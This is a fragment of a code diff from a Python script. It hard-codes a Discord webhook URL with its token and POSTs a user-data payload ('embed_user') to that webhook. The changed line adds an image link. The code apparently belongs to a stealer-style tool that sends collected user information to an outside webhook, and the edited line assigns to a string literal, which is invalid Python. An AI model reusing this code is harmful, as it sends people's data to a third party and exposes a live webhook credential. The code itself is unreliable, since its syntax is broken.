@@ -232,7 +232,7 @@ def main():
 
                
                 webhook_url = 'https://discord.com/api/webhooks/1503345204005048363/myVIbD0_zCXbWrWbJXiFWIAgbYGuCMQRqhX4AqaYQLtED-t4C-_3I2dxRFpLqqKTL4eJ'
-                "image" = ""
+                "image" = "https://cdn.discordapp.com/attachments/1496517576103166173/1502237002949726429/samp_monet.PNG?ex=6a02ef3b&is=6a019dbb&hm=bb1a2aab2dd2afcddafdfb2e40f84158466023eb55eef7cd8fa1305fe440a6cc&"
                 try:
                     urllib.request.urlopen(urllib.request.Request(webhook_url, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
                 except Exception as e:
